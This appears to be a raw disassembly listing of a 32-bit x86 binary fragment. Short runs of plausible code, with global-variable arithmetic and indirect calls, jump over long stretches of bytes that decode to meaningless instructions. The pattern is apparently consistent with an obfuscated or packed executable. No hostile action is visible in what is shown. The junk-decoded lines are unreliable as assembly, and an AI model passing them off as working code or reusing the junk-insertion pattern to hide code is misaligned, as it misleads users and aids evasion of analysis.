  40df7e:	add    eax,edi
  40df80:	inc    ebp
  40df81:	loopne 0x40df0a
  40df83:	ins    BYTE PTR es:[edi],dx
  40df84:	add    BYTE PTR [eax],al
  40df86:	xor    eax,DWORD PTR ds:0x42f63c
  40df8c:	mov    DWORD PTR [ebp-0x24],0x3
  40df93:	add    eax,DWORD PTR ds:0x42f550
  40df99:	mov    DWORD PTR [ebp-0x28],0x998
  40dfa0:	cmp    DWORD PTR ds:0x42f60c,0x0
  40dfa7:	jg     0x40dfd0
  40dfad:	add    DWORD PTR ds:0x42f664,0x42f580
  40dfb7:	jmp    0x40dfd0
  40dfbc:	push   DWORD PTR [ebp-0xc]
  40dfbf:	push   DWORD PTR [ebp-0x1c]
  40dfc2:	push   0x7e20
  40dfc7:	push   DWORD PTR [ebp-0x24]
  40dfca:	call   DWORD PTR ds:0x4387dc
  40dfd0:	mov    eax,DWORD PTR [ebp-0x28]
  40dfd3:	jmp    0x40e0af
  40dfd8:	cld    
  40dfd9:	sahf   
  40dfda:	retf   
  40dfdb:	repz jmp 0x40dfd5
  40dfde:	cld    
  40dfdf:	lahf   
  40dfe0:	push   edx
  40dfe1:	mov    ah,0xbc
  40dfe3:	or     eax,0x2306a28
  40dfe8:	and    edx,DWORD PTR [ebp+0xbf0000]
  40dfee:	add    BYTE PTR [eax],al
  40dff0:	je     0x40dffe
  40dff2:	pop    eax
  40dff3:	xchg   ebx,eax
  40dff4:	in     al,0x33
  40dff6:	sar    BYTE PTR [ecx],0x3d
  40dff9:	call   0x44d4e0cb
  40dffe:	mov    al,BYTE PTR [eax+0x3d23df7e]
  40e004:	call   0x3138:0xe83b89d7
  40e00b:	xor    BYTE PTR [edi+0x14],cl
  40e00e:	xor    bh,BYTE PTR [eax-0x4c0a02a3]
  40e014:	jp     0x40e02d
  40e016:	cld    
  40e017:	cli    
  40e018:	out    0x6,eax
  40e01a:	mov    ecx,fs
  40e01c:	stos   BYTE PTR es:[edi],al
  40e01d:	aaa    
  40e01e:	jbe    0x40dfcf
  40e020:	std    
  40e021:	rcr    DWORD PTR [ebx+0x3737e66b],cl
  40e027:	lock outs dx,BYTE PTR ds:[esi]
  40e029:	sub    al,0xcd
  40e02b:	iret   
  40e02c:	mov    eax,0x36858c68
  40e031:	adc    eax,0x829fc7e5
  40e036:	jae    0x40e03b
  40e038:	push   ebp
  40e039:	hlt    
  40e03a:	xor    esp,esi
  40e03c:	dec    esi
  40e03d:	dec    ebx
  40e03e:	(bad)  
  40e03f:	out    0xd,eax
  40e041:	int3   
  40e042:	int3   
  40e043:	push   ss
  40e044:	aam    0x4a
  40e046:	imul   esi,DWORD PTR [edx+0x48],0xffffffd7
  40e04a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e04b:	cmp    ah,BYTE PTR [ecx+0x2d]
  40e04e:	mov    eax,ds:0xef06ff3e
  40e053:	and    BYTE PTR [edi],bh
  40e055:	jecxz  0x40dfdf
  40e057:	ds int 0xef
  40e05a:	imul   BYTE PTR [eax]
  40e05c:	pop    edi
  40e05d:	xchg   ebx,eax
  40e05e:	mov    ch,0xab
  40e060:	lock mov eax,ds:0xacf0ba1b
  40e066:	pop    edi
  40e067:	jmp    0x23f1:0xd91c8915
  40e06e:	or     ebp,DWORD PTR [esi+0x5f]
  40e071:	mov    edi,0x78fcbb1d
  40e076:	shl    DWORD PTR [ebp+0x67],cl
  40e079:	js     0x40e073
  40e07b:	cdq    
  40e07c:	inc    edi
  40e07d:	inc    esi
  40e07e:	push   ss
  40e07f:	das    
  40e080:	sbb    ch,BYTE PTR [ebx+ecx*1]
  40e083:	sub    esp,ebx
  40e085:	inc    ebp
  40e086:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e087:	dec    eax
  40e088:	fsubr  QWORD PTR [esi]
  40e08a:	call   0xf1616c9
  40e08f:	ins    DWORD PTR es:[edi],dx
  40e090:	fidivr DWORD PTR [esi+0x7a494ec1]
  40e096:	test   ah,cl
  40e098:	inc    edi
  40e099:	lock gs xor eax,0x24c83584
  40e0a0:	push   ebp
  40e0a1:	test   BYTE PTR [ebx],ah
  40e0a3:	push   cs
  40e0a4:	push   DWORD PTR [ecx+0xdf0c2a6]
  40e0aa:	xchg   ebp,eax
  40e0ab:	mov    ebx,0x8b763dbd
  40e0b0:	dec    ebp
  40e0b1:	fadd   QWORD PTR ds:0xfa0
  40e0b7:	xor    edx,edx
  40e0b9:	div    ecx
  40e0bb:	mov    ecx,DWORD PTR [ebp-0x20]
  40e0be:	xor    DWORD PTR ds:0x42f54c,0x332a
  40e0c8:	or     eax,ecx
  40e0ca:	not    ecx
  40e0cc:	jmp    0x40e1a8
  40e0d1:	outs   dx,BYTE PTR ds:[esi]
  40e0d2:	inc    edx
  40e0d3:	and    BYTE PTR [ebx],bh
  40e0d5:	sub    al,0x7b
  40e0d7:	jg     0x40e130
  40e0d9:	shl    DWORD PTR [ebp-0x2f],cl
  40e0dc:	add    al,BYTE PTR [esi]
  40e0de:	sub    al,0xf1
  40e0e0:	xchg   ebp,eax
  40e0e1:	loop   0x40e078
  40e0e3:	add    BYTE PTR [eax],al
  40e0e5:	mov    edi,0xb4000000
  40e0ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0eb:	sub    BYTE PTR [ebp-0x6240d8ec],dl
  40e0f1:	push   ebx
  40e0f2:	mov    cl,0xc2
  40e0f4:	sbb    eax,0x407fffd9
  40e0f9:	fstp   TBYTE PTR ds:[edx+0x9]
  40e0fd:	jle    0x40e0b7
  40e0ff:	and    eax,0x42687fbf
  40e104:	or     eax,0x6a0ab9c1
  40e109:	dec    ebx
  40e10a:	add    esi,DWORD PTR [ebx+0x3a85a2a5]
  40e110:	aam    0x1c
  40e112:	aas    
  40e113:	pop    ds
  40e114:	push   ebx
  40e115:	das    
  40e116:	mov    cl,0x86
  40e118:	push   ecx
  40e119:	call   0x8438:0xde29d71a
  40e120:	cmc    
  40e121:	into   
  40e122:	fld    TBYTE PTR [ecx-0x7f]
  40e125:	mov    bh,0x28
  40e127:	stos   DWORD PTR es:[edi],eax
  40e128:	int    0x5e
  40e12a:	idiv   DWORD PTR [ebx-0x63]
  40e12d:	xchg   ecx,eax
  40e12e:	push   ebx
  40e12f:	jp     0x40e18a
  40e131:	xchg   ebp,eax
  40e132:	shl    BYTE PTR [edi],0x16
  40e135:	mov    ecx,0xfb577725
  40e13a:	xchg   edx,eax
  40e13b:	pop    edi
  40e13c:	stc    
  40e13d:	fwait
  40e13e:	cmp    BYTE PTR [edi+eiz*8],0x5c
  40e142:	repz inc edx
  40e144:	xchg   ebp,eax
  40e145:	in     eax,0x70
  40e147:	xchg   DWORD PTR [edx-0x48],edi
  40e14a:	cmp    esi,ecx
  40e14c:	xchg   edi,eax
  40e14d:	sbb    BYTE PTR [esi+0x981202d],al
  40e153:	das    
  40e154:	jg     0x40e19f
  40e156:	fucomp st(7)
  40e158:	and    al,0xb6
  40e15a:	test   BYTE PTR [edi],dl
  40e15c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e15d:	push   ds
  40e15e:	arpl   WORD PTR [ebx+0x6ce028b],dx
  40e164:	mov    al,0x4f
  40e166:	test   eax,0x1341b86c
  40e16b:	ret    0x3585
  40e16e:	inc    esi
  40e16f:	cmova  esi,DWORD PTR [edx+0x63fe3eb7]
  40e176:	push   eax
  40e177:	or     cl,ah
  40e179:	mov    esi,0x9e2e2378
  40e17e:	outs   dx,BYTE PTR ds:[esi]
  40e17f:	lods   al,BYTE PTR ds:[esi]
  40e180:	dec    eax
  40e181:	and    DWORD PTR [esi+0x7ae0a597],edx
  40e187:	mov    ecx,DWORD PTR [edi-0x3b]
  40e18a:	out    0xae,al
  40e18c:	call   0x81b0713d
  40e191:	div    BYTE PTR [eax-0x15491940]
  40e197:	mov    esi,0xce6a4ba7
  40e19c:	push   esi
  40e19d:	jae    0x40e16c
  40e19f:	test   DWORD PTR [edx+eiz*2+0x3eaa751b],ecx
  40e1a6:	iret   
  40e1a7:	dec    ebp
  40e1a8:	xor    eax,0x6cef
  40e1ad:	sub    ecx,DWORD PTR ds:0x42f610
  40e1b3:	mov    DWORD PTR [ebp-0x1c],eax
  40e1b6:	and    eax,0x5f96
  40e1bb:	jmp    0x40e297
  40e1c0:	mov    bh,ch
  40e1c2:	mov    cl,0xc3
  40e1c4:	test   edi,0xe8f2fdfa
  40e1ca:	push   ecx
  40e1cb:	dec    esi
  40e1cc:	sbb    bh,BYTE PTR [esp+ebx*8+0x69]
  40e1d0:	mov    eax,ds:0xbf000096
  40e1d5:	add    BYTE PTR [eax],al
  40e1d7:	add    BYTE PTR [edi+ebp*2+0x445a2090],al
  40e1de:	mov    WORD PTR [edx],ds
  40e1e0:	popa   
  40e1e1:	and    eax,0x9dda8755
  40e1e6:	pop    esi
  40e1e7:	jae    0x40e21b
  40e1e9:	mov    ah,0x70
  40e1eb:	jecxz  0x40e1d5
  40e1ed:	jno    0x40e178
  40e1ef:	addr16 mov es:0x206b,al
  40e1f4:	adc    bl,BYTE PTR [ebp+ebx*1+0x79]
  40e1f8:	in     al,0xde
  40e1fa:	adc    bl,bh
  40e1fc:	pop    esp
  40e1fd:	mov    gs,WORD PTR [edi+ebp*4+0x76]
  40e201:	or     al,0x37
  40e203:	adc    edi,ecx
  40e205:	fimul  DWORD PTR [edi-0x38]
  40e208:	inc    esi
  40e209:	sbb    eax,0x6592304d
  40e20e:	adc    edx,esi
  40e210:	jb     0x40e1be
  40e212:	inc    esp
  40e213:	fs inc ebx
  40e215:	mov    dh,0x97
  40e217:	inc    esp
  40e218:	stc    
  40e219:	fild   DWORD PTR [edx+0x4]
  40e21c:	mov    dh,0x28
  40e21e:	inc    ebp
  40e21f:	int    0x33
  40e221:	jne    0x40e1a9
  40e223:	push   es
  40e224:	and    BYTE PTR [eax+0x1440cd2e],bl
  40e22a:	repz xor ebp,esi
  40e22d:	xchg   edx,eax
  40e22e:	outs   dx,DWORD PTR ds:[esi]
  40e22f:	push   eax
  40e230:	dec    edx
  40e231:	imul   BYTE PTR ds:0x6f7f2ef1
  40e237:	wbinvd 
  40e239:	jne    0x40e281
  40e23b:	cli    
  40e23c:	cmp    al,0x85
  40e23e:	mov    bh,0xa1
  40e240:	cmp    eax,0x3e581970
  40e245:	jne    0x40e290
  40e247:	fucom  st(7)
  40e249:	mov    eax,ds:0xdc827984
  40e24e:	in     eax,0x8b
  40e250:	xchg   edx,eax
  40e251:	mov    ah,0x64
  40e253:	inc    ecx
  40e254:	test   ah,al
  40e256:	pop    esi
  40e257:	lds    esp,FWORD PTR [edi]
  40e259:	arpl   WORD PTR [eax+0x27ddcb03],ax
  40e25f:	jmp    0x40e285
  40e261:	pop    edx
  40e262:	pusha  
  40e263:	xchg   cl,ah
  40e265:	sub    eax,ecx
  40e267:	jnp    0x40e2af
  40e269:	push   edi
  40e26a:	adc    eax,0x1084889
  40e26f:	sub    bl,ah
  40e271:	div    BYTE PTR [ebp+0x367b6ade]
  40e277:	mov    ebx,0x661bc72
  40e27c:	lods   eax,DWORD PTR ds:[esi]
  40e27d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e27e:	fisubr DWORD PTR [edx+0x6b50df01]
  40e284:	xchg   ecx,eax
  40e285:	inc    eax
  40e286:	mov    ebp,0x808bf987
  40e28b:	jmp    0x2cfd:0x1059c7fa
  40e292:	mov    dh,dh
  40e294:	mov    ch,0xf7
  40e296:	loopne 0x40e25f
  40e298:	inc    ebp
  40e299:	fsubr  DWORD PTR [edi-0x7cfffffa]
  40e29f:	cmp    eax,0x42f5b0
  40e2a4:	add    BYTE PTR [edi],cl
  40e2a6:	mov    ?,edx
  40e2a8:	add    BYTE PTR [eax],al
  40e2aa:	add    BYTE PTR [ebx],cl
  40e2ac:	add    eax,0x42f630
  40e2b1:	jmp    0x40e39d
  40e2b6:	push   0x3809
  40e2bb:	call   DWORD PTR ds:0x4387b0
  40e2c1:	jmp    0x40e39d
  40e2c6:	cmp    BYTE PTR [edx],ah
  40e2c8:	sub    DWORD PTR [ebx+ebx*4-0x749c251],0x3002b28a
  40e2d3:	mov    DWORD PTR [edi+0x65],esp
  40e2d6:	pusha  
  40e2d7:	xchg   edi,eax
  40e2d8:	add    BYTE PTR [eax],al
  40e2da:	mov    edi,0x8b000000
  40e2df:	ss cwde 
  40e2e1:	dec    ebp
  40e2e2:	mov    ebp,?
  40e2e4:	and    ecx,esi
  40e2e6:	test   al,0x0
  40e2e8:	push   edi
  40e2e9:	int3   
  40e2ea:	mov    esi,0x388b985f
  40e2ef:	dec    edi
  40e2f0:	sahf   
  40e2f1:	arpl   WORD PTR [ebx-0x78ca2e68],ax
  40e2f7:	icebp  
  40e2f8:	enter  0x8547,0x78
  40e2fc:	jo     0x40e323
  40e2fe:	or     al,al
  40e300:	outs   dx,BYTE PTR ds:[esi]
  40e301:	jo     0x40e297
  40e303:	outs   dx,BYTE PTR ds:[esi]
  40e304:	aam    0x59
  40e306:	sbb    BYTE PTR [ebp-0x24c7a67a],dh
  40e30c:	jmp    0x175c9637
  40e311:	sub    BYTE PTR [esi+0x5cf8736c],bh
  40e317:	xchg   edx,eax
  40e318:	xchg   edi,eax
  40e319:	(bad)  
  40e31a:	test   BYTE PTR [eax-0x66c15d60],0x74
  40e321:	mov    esp,0x1e8a2c31
  40e326:	div    DWORD PTR [ecx]
  40e328:	stos   BYTE PTR es:[edi],al
  40e329:	add    al,0xd4
  40e32b:	out    0x35,al
  40e32d:	cmp    al,0x2c
  40e32f:	mov    DWORD PTR [edi+edx*1-0x6459900b],ecx
  40e336:	icebp  
  40e337:	fstp   st(3)
  40e339:	in     al,0xc1
  40e33b:	add    eax,0xbf7eb11a
  40e340:	test   eax,0xf6b8041
  40e345:	fcmovnb st,st(4)
  40e347:	in     eax,dx
  40e348:	adc    cl,bh
  40e34a:	xor    BYTE PTR [eax-0x51d71252],ch
  40e350:	fidiv  DWORD PTR [eax-0x27]
  40e353:	bswap  edx
  40e355:	mov    WORD PTR [eax],ss
  40e357:	imul   BYTE PTR [ebx+0x568b8f0e]
  40e35d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e35e:	mov    ds:0x739198ea,eax
  40e363:	inc    edi
  40e364:	fcomp  QWORD PTR [edx]
  40e366:	mov    edx,0xb8c289f2
  40e36b:	std    
  40e36c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e36d:	sar    BYTE PTR ds:0xa97e1e8b,cl
  40e373:	dec    esp
  40e374:	inc    eax
  40e375:	inc    ebp
  40e376:	mov    al,ds:0x2706ea1f
  40e37b:	mov    ah,0xd2
  40e37d:	(bad)  
  40e37e:	icebp  
  40e37f:	arpl   sp,bp
  40e381:	out    dx,eax
  40e382:	push   ss
  40e383:	cmp    DWORD PTR [edx-0x63],esi
  40e386:	jmp    FWORD PTR [edx+0x5a]
  40e389:	xchg   esi,eax
  40e38a:	cmp    eax,0x434c5282
  40e38f:	fidiv  DWORD PTR [ebp-0x3727ae49]
  40e395:	jo     0x40e3ec
  40e397:	inc    eax
  40e398:	mov    ah,0xa2
  40e39a:	mov    dh,0xd5
  40e39c:	jnp    0x40e329
  40e39e:	inc    ebp
  40e39f:	fsubr  st,st(1)
  40e3a1:	xlat   BYTE PTR ds:[ebx]
  40e3a2:	add    BYTE PTR [eax],al
  40e3a4:	add    BYTE PTR [eax-0xc288c8f],dl
  40e3aa:	xlat   BYTE PTR ds:[ebx]
  40e3ab:	mov    ah,0x77
  40e3ad:	jns    0x40e3d7
  40e3af:	inc    esi
  40e3b0:	in     al,0x24
  40e3b2:	adc    DWORD PTR [ecx+0xd],ecx
  40e3b5:	pop    ds
  40e3b6:	cwde   
  40e3b7:	add    BYTE PTR [eax],al
  40e3b9:	mov    edi,0x2c000000
  40e3be:	fs jns 0x40e36b
  40e3c1:	mov    ecx,0xb7898c65
  40e3c6:	ret    0x6ee4
  40e3c9:	pop    edx
  40e3ca:	fst    DWORD PTR [eax-0x3d]
  40e3cd:	sti    
  40e3ce:	mov    ds:0xb835a641,al
  40e3d3:	(bad)  
  40e3d4:	(bad)  gs:[edi-0x61ffa1f7]
  40e3db:	cmp    BYTE PTR [edx],0xea
  40e3de:	cld    
  40e3df:	repz cmp al,0x97
  40e3e2:	mov    BYTE PTR [ebp+0x1f],bl
  40e3e5:	xchg   esp,eax
  40e3e6:	lea    esi,[ecx+eiz*4+0x71]
  40e3ea:	sahf   
  40e3eb:	pop    ebx
  40e3ec:	ret    
  40e3ed:	popa   
  40e3ee:	test   DWORD PTR ds:0xa7304dc7,edi
  40e3f4:	inc    ebp
  40e3f5:	das    
  40e3f6:	call   0xfcdf3757
  40e3fb:	cmp    DWORD PTR [eax-0x44],edi
  40e3fe:	or     bl,dh
  40e400:	imul   ecx,DWORD PTR [edx+ebp*2+0x7aeb7b59],0x9fb1bb90
  40e40b:	les    ebx,FWORD PTR [edi+0x156101aa]
  40e411:	xchg   edx,eax
  40e412:	pop    eax
  40e413:	faddp  st(2),st
  40e415:	in     eax,dx
  40e416:	mov    edx,0x89834bd
  40e41b:	inc    esp
  40e41c:	xchg   edi,eax
  40e41d:	in     al,0x98
  40e41f:	mov    ds,WORD PTR [eax]
  40e421:	(bad)  
  40e422:	out    dx,al
  40e423:	(bad)  
  40e424:	icebp  
  40e425:	adc    BYTE PTR [eax+0x4c],cl
  40e428:	jb     0x40e3c0
  40e42a:	mul    DWORD PTR [edx+eax*1-0x55]
  40e42e:	fstp   DWORD PTR [eax-0x1f]
  40e431:	fdivr  QWORD PTR [bp+si]
  40e434:	scas   al,BYTE PTR es:[edi]
  40e435:	dec    edi
  40e436:	(bad)  
  40e437:	and    al,0xa6
  40e439:	retf   0x3346
  40e43c:	or     edi,DWORD PTR ds:0x1f5fd29
  40e442:	and    cl,BYTE PTR [edi+0x2d]
  40e445:	dec    edx
  40e446:	gs retf 0xe7e1
  40e44a:	cmp    DWORD PTR ds:0xdd219b98,esp
  40e450:	scas   al,BYTE PTR es:[edi]
  40e451:	adc    bl,al
  40e453:	dec    edi
  40e454:	jl     0x40e402
  40e456:	jle    0x40e408
  40e458:	call   DWORD PTR [esi+0x6b9f7704]
  40e45e:	cmp    eax,0x39768a0d
  40e463:	push   es
  40e464:	das    
  40e465:	hlt    
  40e466:	and    ebp,DWORD PTR [ecx-0x7666e91f]
  40e46c:	mov    edx,0x100d168f
  40e471:	aaa    
  40e472:	add    al,0x45
  40e474:	aad    0x6d
  40e476:	ret    0x3753
  40e479:	add    eax,0x392dad3e
  40e47e:	adc    al,BYTE PTR [eax]
  40e480:	add    cl,ch
  40e482:	xlat   BYTE PTR ds:[ebx]
  40e483:	add    BYTE PTR [eax],al
  40e485:	add    ah,bh
  40e487:	retf   
  40e488:	mov    ds,WORD PTR [ecx]
  40e48a:	mov    edi,0x4defff5d
  40e48f:	loop   0x40e424
  40e491:	int    0xf4
  40e493:	push   es
  40e494:	ret    0xde33
  40e497:	cwde   
  40e498:	add    BYTE PTR [eax],al
  40e49a:	mov    edi,0x7b000000
  40e49f:	mov    ds:0xf7febfe3,al
  40e4a4:	popa   
  40e4a5:	xor    BYTE PTR [esp+ecx*2],bh
  40e4a8:	fistp  DWORD PTR [eax+0x6b]
  40e4ab:	or     ecx,edi
  40e4ad:	or     DWORD PTR ds:0x1c228fa4,ebp
  40e4b3:	sbb    al,0xaa
  40e4b5:	popa   
  40e4b6:	push   edi
  40e4b7:	dec    ebx
  40e4b8:	jnp    0x40e47b
  40e4ba:	loope  0x40e538
  40e4bc:	popf   
  40e4bd:	pop    ecx
  40e4be:	mov    ds:0x39325d94,al
  40e4c3:	push   esi
  40e4c4:	(bad)
  40e4c7:	lahf   
  40e4c8:	jnp    0x40e4a3
  40e4ca:	cmc    
  40e4cb:	ficomp DWORD PTR [eax+0x443063e0]
  40e4d1:	div    dh
  40e4d3:	daa    
  40e4d4:	mov    ebp,esi
  40e4d6:	clc    
  40e4d7:	je     0x40e531
  40e4d9:	sub    ah,dh
  40e4db:	adc    ah,BYTE PTR [edi]
  40e4dd:	xchg   BYTE PTR [ecx],dh
  40e4df:	pop    ebp
  40e4e0:	jl     0x40e49e
  40e4e2:	(bad)  
  40e4e3:	cmp    edx,DWORD PTR [ecx-0x29]
  40e4e6:	jo     0x40e532
  40e4e8:	inc    ebx
  40e4e9:	push   0xbe09cc88
  40e4ee:	xchg   ecx,eax
  40e4ef:	cdq    
  40e4f0:	aas    
  40e4f1:	push   0xde5802e1
  40e4f6:	dec    ecx
  40e4f7:	call   0xbea4:0x65323a54
  40e4fe:	pop    es
  40e4ff:	adc    edi,eax
  40e501:	push   ebx
  40e502:	retf   0x2926
  40e505:	psubd  mm7,mm0
  40e508:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e509:	mov    esp,gs
  40e50b:	jp     0x40e4a7
  40e50d:	add    eax,0xbf494509
  40e512:	imul   edi,esp,0xffffffe1
  40e515:	es jne 0x40e4b7
  40e518:	fisttp WORD PTR [edi+0x3d5ce1aa]
  40e51e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e51f:	xchg   ebp,eax
  40e520:	xchg   edi,eax
  40e521:	jge    0x40e598
  40e523:	mov    ebx,0xb4e0a8ef
  40e528:	xor    esi,ebx
  40e52a:	in     eax,0xa5
  40e52c:	jae    0x40e4b8
  40e52e:	jl     0x40e52f
  40e530:	cwde   
  40e531:	sar    BYTE PTR [edi],0x4
  40e534:	sbb    al,0x55
  40e536:	mov    ds:0x799d51b6,eax
  40e53b:	adc    ebp,edi
  40e53d:	std    
  40e53e:	pop    edi
  40e53f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e540:	mov    bl,0xe3
  40e542:	push   ebp
  40e543:	add    bh,al
  40e545:	test   eax,ebp
  40e547:	imul   esp,DWORD PTR [edx+0x2f75f517],0x9fc7cfa1
  40e551:	aaa    
  40e552:	sub    BYTE PTR [esi-0x22e064fb],bh
  40e558:	(bad)  
  40e559:	and    eax,0x256e20ff
  40e55e:	xchg   esi,eax
  40e55f:	cmp    eax,DWORD PTR [eax]
  40e561:	add    BYTE PTR ds:0x3016,ch
  40e567:	mov    DWORD PTR [ebp-0x24],eax
  40e56a:	mov    DWORD PTR [ebp-0x24],0xd2b
  40e571:	neg    eax
  40e573:	mov    DWORD PTR [ebp-0x28],0x55cd
  40e57a:	or     DWORD PTR ds:0x42f614,ecx
  40e580:	mov    eax,DWORD PTR [ebp-0x28]
  40e583:	cmp    DWORD PTR ds:0x42f53c,0x0
  40e58a:	jbe    0x40e5b8
  40e590:	sub    DWORD PTR ds:0x42f66c,0x42f62c
  40e59a:	and    ecx,DWORD PTR ds:0x42f648
  40e5a0:	jmp    0x40e5b8
  40e5a5:	push   0x2a50
  40e5aa:	push   DWORD PTR [ebp-0x1c]
  40e5ad:	push   0x786e
  40e5b2:	call   DWORD PTR ds:0x43880c
  40e5b8:	mov    ecx,DWORD PTR [ebp-0x24]
  40e5bb:	xor    eax,0x4887
  40e5c0:	add    eax,0x1b29
  40e5c5:	imul   eax,eax,0x5a4
  40e5cb:	or     eax,ecx
  40e5cd:	sub    ecx,DWORD PTR ds:0x42f560
  40e5d3:	jmp    0x40e6af
  40e5d8:	sub    al,0x27
  40e5da:	add    eax,0xacaf0f8d
  40e5df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5e0:	pop    edi
  40e5e1:	test   BYTE PTR [esi+ecx*2-0x52],0x1f
  40e5e6:	sub    dh,bl
  40e5e8:	popf   
  40e5e9:	cdq    
  40e5ea:	add    BYTE PTR [eax],al
  40e5ec:	mov    edi,0x41000000
  40e5f1:	ins    BYTE PTR es:[edi],dx
  40e5f2:	mov    cl,0x96
  40e5f4:	dec    eax
  40e5f5:	xor    ebp,DWORD PTR [edi]
  40e5f7:	shl    al,0xd7
  40e5fa:	pop    ebx
  40e5fb:	jecxz  0x40e5c8
  40e5fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5fe:	ret    
  40e5ff:	nop
  40e600:	iret   
  40e601:	fs mov esi,0xe5cdf311
  40e607:	scas   al,BYTE PTR es:[edi]
  40e608:	out    0x6d,al
  40e60a:	out    0xc7,al
  40e60c:	xchg   ecx,eax
  40e60d:	sbb    ecx,DWORD PTR [esi-0x73]
  40e610:	push   cs
  40e611:	data16 fdiv st(1),st
  40e614:	mov    bh,0xf6
  40e616:	jmp    DWORD PTR [esi-0x60]
  40e619:	repnz iret 
  40e61b:	push   es
  40e61c:	test   ah,dl
  40e61e:	aam    0x33
  40e620:	push   0xffffffe6
  40e622:	mov    al,ds:0xb911e8af
  40e627:	fwait
  40e628:	repnz mov esi,0x533a12a5
  40e62e:	les    edi,FWORD PTR [esi-0x57]
  40e631:	scas   al,BYTE PTR es:[edi]
  40e632:	and    BYTE PTR [ebp+0x18],al
  40e635:	or     DWORD PTR [edx*8+0x36beaafb],ecx
  40e63c:	mov    edi,edi
  40e63e:	cmp    edx,eax
  40e640:	stos   BYTE PTR es:[edi],al
  40e641:	(bad)  
  40e642:	cmp    ch,BYTE PTR [ecx]
  40e644:	idiv   BYTE PTR [ebp-0x23f66f3d]
  40e64a:	mov    esp,0xfa59785e
  40e64f:	rol    DWORD PTR [eax+0x1c1b4751],0x72
  40e656:	stos   DWORD PTR es:[edi],eax
  40e657:	loopne 0x40e695
  40e659:	stos   DWORD PTR es:[edi],eax
  40e65a:	xchg   esp,eax
  40e65b:	sub    eax,0x4eb31f76
  40e660:	aam    0x23
  40e662:	adc    esi,DWORD PTR [edi+0x2fa9ca31]
  40e668:	mov    dl,0xcc
  40e66a:	test   BYTE PTR [ebx-0x50],ch
  40e66d:	imul   ecx,DWORD PTR [esi-0x18b515ca],0x23cea0fb
  40e677:	mov    edi,0x648d9671
  40e67c:	repnz (bad) 
  40e67f:	test   BYTE PTR [ebx],ah
  40e681:	das    
  40e682:	int3   
  40e683:	gs into 
  40e685:	pop    edi
  40e686:	sub    bl,cl
  40e688:	and    eax,0x9973a606
  40e68d:	sub    BYTE PTR [eax+0x3b985ea0],al
  40e693:	rcr    DWORD PTR [ebp+0x4a9b5d40],0x5
  40e69a:	jp     0x40e64d
  40e69c:	and    DWORD PTR [ebp+eax*1+0x7],esp
  40e6a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6a1:	pop    ebx
  40e6a2:	in     eax,dx
  40e6a3:	loope  0x40e647
  40e6a5:	daa    
  40e6a6:	div    ecx
  40e6a8:	push   ebx
  40e6a9:	cmp    esp,DWORD PTR [eax+0x416ba4b7]
  40e6af:	sub    eax,0x13e6daf
  40e6b4:	adc    DWORD PTR ds:0x42f5bc,0x74a5
  40e6be:	jmp    0x40e79a
  40e6c3:	js     0x40e738
  40e6c5:	mov    dh,0x4
  40e6c7:	mov    edi,0x7ffac5
  40e6cc:	push   es
  40e6cd:	xchg   ebp,eax
  40e6ce:	mov    eax,ds:0xa1f88e95
  40e6d3:	pop    esp
  40e6d4:	call   0x0:0xbf0000
  40e6db:	rcr    DWORD PTR [ebp-0x59],1
  40e6de:	adc    eax,0x86aad717
  40e6e3:	mov    eax,0xb2973790
  40e6e8:	rcr    BYTE PTR [esi],0x4c
  40e6eb:	xchg   ebp,eax
  40e6ec:	jmp    0x40e68e
  40e6ee:	test   al,0x95
  40e6f0:	adc    eax,0xd97be00a
  40e6f5:	pop    edi
  40e6f6:	dec    ebx
  40e6f7:	add    al,0xd7
  40e6f9:	add    ah,dh
  40e6fb:	dec    ecx
  40e6fc:	(bad)  
  40e6fd:	sahf   
  40e6fe:	ins    BYTE PTR es:[edi],dx
  40e6ff:	addr16 stc 
  40e701:	cs mov esi,0xf950acdf
  40e707:	cmc    
  40e708:	jmp    0x40e711
  40e70a:	jns    0x40e76f
  40e70c:	ficom  DWORD PTR [edi+ebx*2+0x77]
  40e710:	and    BYTE PTR [edx+0x1a81f530],bl
  40e716:	ins    BYTE PTR es:[edi],dx
  40e717:	ficomp DWORD PTR [ebx-0x19038a1]
  40e71d:	das    
  40e71e:	mov    dl,ah
  40e720:	pusha  
  40e721:	mov    ds:0x32d04219,eax
  40e726:	mov    al,0xb6
  40e728:	inc    ecx
  40e729:	sti    
  40e72a:	sbb    BYTE PTR [esi+esi*1-0x1500cc05],0x29
  40e732:	loope  0x40e793
  40e734:	push   edi
  40e735:	mov    eax,DWORD PTR [ecx]
  40e737:	call   0x7de8:0x85a2139b
  40e73e:	outs   dx,BYTE PTR ds:[esi]
  40e73f:	xchg   BYTE PTR [edx+0x67],bl
  40e742:	sbb    DWORD PTR [ebp-0x20a43e7c],eax
  40e748:	fiadd  DWORD PTR [ebp+0x13]
  40e74b:	mov    bh,0xb6
  40e74d:	mov    ecx,0x3427b4f2
  40e752:	mov    edi,0x5682a151
  40e757:	dec    edx
  40e758:	fdivrp st(6),st
  40e75a:	pop    ebx
  40e75b:	int3   
  40e75c:	dec    edx
  40e75d:	cmp    ch,dl
  40e75f:	(bad)  
  40e760:	loop   0x40e6fc
  40e762:	ret    
  40e763:	mov    cl,0x6f
  40e765:	lea    esi,[eax]
  40e767:	mov    esi,0xd62646e9
  40e76c:	loop   0x40e755
  40e76e:	int3   
  40e76f:	dec    ebp
  40e770:	add    edx,DWORD PTR [eax]
  40e772:	cwde   
  40e773:	dec    eax
  40e774:	inc    ebp
  40e775:	fdivr  DWORD PTR [ecx+0x75]
  40e778:	sbb    ebx,DWORD PTR [edi-0x24e0ffbf]
  40e77e:	mov    al,ds:0xff7c4df0
  40e783:	mov    dl,0xd1
  40e785:	cdq    
  40e786:	and    DWORD PTR [ebp+0x6d],0x5c
  40e78a:	pop    edi
